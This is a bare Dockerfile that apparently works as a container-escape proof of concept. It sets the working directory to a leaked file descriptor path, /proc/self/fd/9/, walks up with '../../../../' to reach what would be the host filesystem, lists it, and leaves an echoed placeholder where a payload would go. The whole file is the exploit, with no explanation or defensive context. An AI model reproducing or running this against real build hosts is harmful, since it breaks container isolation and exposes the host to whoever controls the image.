FROM ubuntu
RUN ls /

WORKDIR /proc/self/fd/9/

RUN cd ../../../../ && \
    ls && \
    echo "malicious code here"
